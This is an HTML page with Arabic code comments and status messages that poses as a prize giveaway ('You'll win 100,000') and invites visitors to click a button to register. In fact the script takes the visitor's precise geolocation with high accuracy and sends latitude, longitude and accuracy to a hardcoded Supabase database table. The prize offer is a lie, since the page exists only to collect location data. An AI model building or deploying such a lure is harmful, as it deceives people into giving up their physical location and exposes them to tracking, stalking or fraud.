<!DOCTYPE html>
<html lang="ar" dir="rtl">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> Win up to 100,000 </title>

    <style>
        * {
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: #f5f5f5;
            margin: 0;
            padding: 50px 20px;
            text-align: center;
        }

        .box {
            max-width: 500px;
            margin: auto;
            background: white;
            padding: 30px;
            border-radius: 15px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.10);
        }

        h2 {
            margin-bottom: 15px;
        }

        p {
            color: #555;
        }

        button {
            background: #007bff;
            color: white;
            border: none;
            padding: 14px 28px;
            border-radius: 8px;
            font-size: 17px;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background: #0056b3;
        }

        button:disabled {
            background: #888;
            cursor: not-allowed;
        }

        #result {
            margin-top: 25px;
            line-height: 2;
            word-break: break-word;
        }

        .success {
            color: green;
            font-weight: bold;
        }

        .error {
            color: red;
            font-weight: bold;
        }

        a {
            display: inline-block;
            margin-top: 15px;
            color: #007bff;
            text-decoration: none;
        }
    </style>
</head>

<body>

<div class="box">

    <h2> You’ll win 100,000 </h2>

    <p>
       Go register your name to be among the winners.
    </p>

    <button id="locationButton">
    Win up to 100,000   
    </button>

    <div id="result"></div>

</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>

<script>

    /* بيانات Supabase */

    const SUPABASE_URL =
        "https://vsztpvsicsmxjhsvqzbv.supabase.co";

    const SUPABASE_PUBLISHABLE_KEY =
        "sb_publishable_N2P-l8nE7GaChsD5lrxb4w_nr8K5UrM";


    /* إنشاء الاتصال */

    const supabaseClient =
        window.supabase.createClient(
            SUPABASE_URL,
            SUPABASE_PUBLISHABLE_KEY
        );


    const button =
        document.getElementById("locationButton");

    const result =
        document.getElementById("result");


    /* زر مشاركة الموقع */

    button.addEventListener("click", getLocation);


    async function getLocation() {

        if (!navigator.geolocation) {

            result.innerHTML =
                '<span class="error">' +
                'المتصفح لا يدعم تحديد الموقع.' +
                '</span>';

            return;
        }


        button.disabled = true;

        result.innerHTML =
            "جاري طلب إذن الموقع...";


        navigator.geolocation.getCurrentPosition(

            async function(position) {

                const latitude =
                    position.coords.latitude;

                const longitude =
                    position.coords.longitude;

                const accuracy =
                    position.coords.accuracy;


                result.innerHTML =
                    "جاري حفظ الموقع...";


                try {

                    const { error } =
                        await supabaseClient
                            .from("locations")
                            .insert({
                                latitude: latitude,
                                longitude: longitude,
                                accuracy: accuracy
                            });


                    if (error) {

                        console.error(error);

                        result.innerHTML =
                            '<span class="error">' +
                            '❌ فشل حفظ الموقع' +
                            '<br><br>' +
                            error.message +
                            '</span>';

                        button.disabled = false;

                        return;
                    }


                    const mapUrl =
                        "https://www.google.com/maps?q=" +
                        latitude +
                        "," +
                        longitude;


                    result.innerHTML = `

                        <span class="success">
                            ✅ تم حفظ الموقع بنجاح
                        </span>

                        <br><br>

                        خط العرض:
                        ${latitude}

                        <br>

                        خط الطول:
                        ${longitude}

                        <br>

                        الدقة التقريبية:
                        ${Math.round(accuracy)} متر

                        <br>

                        <a
                            href="${mapUrl}"
                            target="_blank"
                        >
                            📍 فتح الموقع على Google Maps
                        </a>

                    `;


                    button.disabled = false;

                }

                catch (error) {

                    console.error(error);

                    result.innerHTML =
                        '<span class="error">' +
                        '❌ حدث خطأ في الاتصال بقاعدة البيانات.' +
                        '</span>';

                    button.disabled = false;
                }

            },


            function(error) {

                console.error(error);


                if (error.code === 1) {

                    result.innerHTML =
                        '<span class="error">' +
                        '❌ تم رفض إذن مشاركة الموقع.' +
                        '</span>';

                }

                else if (error.code === 2) {

                    result.innerHTML =
                        '<span class="error">' +
                        '❌ تعذر تحديد الموقع.' +
                        '</span>';

                }

                else if (error.code === 3) {

                    result.innerHTML =
                        '<span class="error">' +
                        '❌ انتهت مهلة تحديد الموقع.' +
                        '</span>';

                }

                else {

                    result.innerHTML =
                        '<span class="error">' +
                        '❌ حدث خطأ أثناء تحديد الموقع.' +
                        '</span>';
                }


                button.disabled = false;
            },


            {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            }

        );
    }

</script>

</body>
</html>
